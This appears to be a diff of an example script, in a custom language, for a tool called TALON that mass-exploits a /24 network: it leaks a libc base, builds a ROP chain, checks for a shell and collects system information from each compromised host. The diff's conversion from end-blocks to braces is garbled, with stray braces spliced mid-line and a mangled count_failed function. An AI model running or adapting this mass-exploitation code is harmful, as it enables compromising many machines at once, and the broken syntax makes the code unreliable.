@@ -1,4 +1,4 @@
-// TALON Swarm Mass Exploitation Example
+﻿// TALON Swarm Mass Exploitation Example
 // Demonstrates concurrent exploitation of 100+ targets using distributed swarm
 //
 // Usage:
@@ -39,11 +39,9 @@ print "  Retry attempts: " + retry_attempts
 // Define target list (in production, this would come from network scan)
 // Each agent receives a subset based on swarm distribution
 let targets = []
-for i in range(1, 255)
-    let ip = "192.168.1." + i
+for i in range(1, 255) {    let ip = "192.168.1." + i
     targets = [...targets, ip]
-end
-
+}
 print "Total targets: " + len(targets)
 
 // Mass connection phase with automatic retry
@@ -88,10 +86,8 @@ for result in connection_results
                 // swarm.sync() allows agents to share discovered information
                 let is_new_libc = swarm_sync_libc(libc_base, target_ip)
                 
-                if is_new_libc
-                    print "  New libc base discovered: 0x" + hex(libc_base)
-                end
-                
+                if is_new_libc {                    print "  New libc base discovered: 0x" + hex(libc_base)
+                }
                 // Build ROP chain using synchronized gadget database
                 // Gadgets are automatically shared across agents via swarm.sync()
                 let pop_rdi = libc_base + 0x26b72
@@ -116,12 +112,7 @@ for result in connection_results
                 send conn_id, "id\n"
                 let response = recv conn_id, 1024
                 
-                if contains(response, "uid=")
-                    print "  SUCCESS: Shell obtained on " + target_ip
-                    successful_count = successful_count + 1
-                    
-                    // Collect target information
-                    send conn_id, "uname -a\n"
+                if contains(response, "uid=") {                    print "  SUCCESS: Shell obtained on " + target_ip {                    successful_count = successful_count + 1 {                     {                    // Collect target information {                    send conn_id, "uname -a\n"
                     let system_info = recv conn_id, 1024
                     
                     send conn_id, "cat /etc/os-release\n"
@@ -136,8 +127,7 @@ for result in connection_results
                         "os_info": os_info,
                         "agent_id": get_agent_id()
                     }]
-                else
-                    print "  FAILED: No shell on " + target_ip
+                } else {                    print "  FAILED: No shell on " + target_ip
                     failed_count = failed_count + 1
                     
                     exploit_results = [...exploit_results, {
@@ -146,9 +136,8 @@ for result in connection_results
                         "error": "Shell verification failed",
                         "last_response": response
                     }]
-                end
-            else
-                print "  FAILED: Invalid leak response from " + target_ip
+                }
+            } else {                print "  FAILED: Invalid leak response from " + target_ip
                 failed_count = failed_count + 1
                 
                 exploit_results = [...exploit_results, {
@@ -156,8 +145,7 @@ for result in connection_results
                     "success": false,
                     "error": "Leak failed or timeout"
                 }]
-            end
-            
+            }
         catch error
             print "  ERROR exploiting " + target_ip + ": " + error
             failed_count = failed_count + 1
@@ -167,10 +155,9 @@ for result in connection_results
                 "success": false,
                 "error": error
             }]
-        end
-    end
-end
-
+        }
+    }
+}
 // Summary
 print ""
 print "Mass Exploitation Complete"
@@ -198,23 +185,13 @@ return {
 define count_successful(results)
     let count = 0
     for result in results
-        if result.success
-            count = count + 1
-        end
-    end
+        if result.success {            count = count + 1 {        } {    }
     return count
-end
-
+}
 define count_failed(results)
     let count = 0
     for result in results
-        if !result.success
-            count = count + 1
-        end
-    end
-    return count
-end
-
+        if !result.success {            count = count + 1 {        } {    } {    return count {}
 // Synchronize libc base discovery across swarm
 // This is a mock function - in real implementation, this would use swarm.sync()
 define swarm_sync_libc(libc_base, target_ip)
@@ -225,15 +202,13 @@ define swarm_sync_libc(libc_base, target_ip)
     
     // For this example, we simulate new discovery
     return true
-end
-
+}
 // Get current agent ID from swarm context
 define get_agent_id()
     // In production, this would query swarm context
     // For this example, return placeholder
     return "agent-local"
-end
-
+}
 // Expected output when run via swarm controller:
 //
 // Swarm Mass Exploitation Results
